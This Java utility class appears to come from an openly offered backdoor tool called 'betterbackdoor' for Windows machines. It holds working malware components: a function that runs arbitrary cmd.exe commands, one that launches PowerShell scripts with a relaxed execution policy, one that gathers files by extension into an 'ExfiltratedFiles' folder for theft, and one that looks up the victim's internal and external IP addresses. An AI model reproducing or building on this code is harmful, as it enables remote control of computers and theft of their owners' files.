package com.github.thatcherdev.betterbackdoor.backend;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Inet4Address;
import java.net.Inet6Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Enumeration;

import com.github.thatcherdev.betterbackdoor.backdoor.Backdoor;

import org.apache.commons.io.FileUtils;

public class Utils {

	/**
	 * Runs command {@link command} in the current machine's command prompt and
	 * returns response.
	 *
	 * @param command command to run
	 * @return response from running command
	 */
	public static String runCommand(String command) {
		String resp = "";
		BufferedReader bufferedReader = null;
		try {
			ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", command);
			builder.redirectErrorStream(true);
			bufferedReader = new BufferedReader(new InputStreamReader(builder.start().getInputStream()));
			while (true) {
				String line = bufferedReader.readLine();
				if (line == null) {
					while (resp.endsWith("\n"))
						resp = resp.substring(0, resp.length() - 1);
					break;
				}
				resp += line + "\n";
			}
			if (resp.isEmpty())
				return "Command did not produce a response";
			else
				return resp;
		} catch (Exception e) {
			resp = "An error occurred when trying to run command";
			if (e.getMessage() != null)
				resp += ":\n" + e.getMessage();
			return resp;
		} finally {
			try {
				if (bufferedReader != null)
					bufferedReader.close();
			} catch (Exception e) {
			}
		}
	}

	/**
	 * Uses {@link #runCommand(String)} to run the PowerShell script with the name
	 * {@link filename}.
	 *
	 * @param filename name of script to run
	 * @return response from running script
	 */
	public static String runPSScript(String filename) {
		return runCommand("Powershell.exe -executionpolicy remotesigned -File " + filename);
	}

	/**
	 * Copies all files that have extensions in {@link exts} from {@link root} to
	 * {@link Backdoor#gatheredDir}\ExfiltratedFiles'.
	 *
	 * @param root directory to copy files from
	 * @param exts list of extensions of files to copy
	 * @throws IOException
	 */
	public static void exfilFiles(String root, ArrayList<String> exts) throws IOException {
		new File(Backdoor.gatheredDir + "ExfiltratedFiles").mkdir();
		for (String ext : exts)
			for (String file : new ArrayList<String>(
					Arrays.asList(Utils.runCommand("c: && cd " + root + " && dir/b/s/a:-d *." + ext).split("\n"))))
				if (!file.equals("File Not Found"))
					FileUtils.copyFile(new File(file), new File(
							Backdoor.gatheredDir + "ExfiltratedFiles\\" + file.substring(file.lastIndexOf("\\") + 1)));
	}

	/**
	 * If {@link ipType} is "internal", returns the internal IP address of the
	 * current machine. Otherwise, if {@link ipType} is "external", returns the
	 * external IP address of the current machine.
	 * 
	 * @param ipType type of IP address to return
	 * @return either the internal or external IP address of the current machine
	 * @throws IOException
	 */
	public static String getIP(String ipType) throws IOException {
		String ret = null;
		if (ipType.equals("internal")) {
			Enumeration<NetworkInterface> majorInterfaces = NetworkInterface.getNetworkInterfaces();
			while (majorInterfaces.hasMoreElements()) {
				NetworkInterface inter = (NetworkInterface) majorInterfaces.nextElement();
				for (Enumeration<InetAddress> minorInterfaces = inter.getInetAddresses(); minorInterfaces
						.hasMoreElements();) {
					InetAddress add = (InetAddress) minorInterfaces.nextElement();
					if (!add.isLoopbackAddress())
						if (add instanceof Inet4Address)
							ret = add.getHostAddress();
						else if (add instanceof Inet6Address)
							continue;
				}
			}
		} else if (ipType.equals("external")) {
			URL checkIP = new URL("http://checkip.amazonaws.com");
			BufferedReader in = new BufferedReader(new InputStreamReader(checkIP.openStream()));
			String ip = in.readLine();
			in.close();
			ret = ip;
		}
		return ret;
	}
}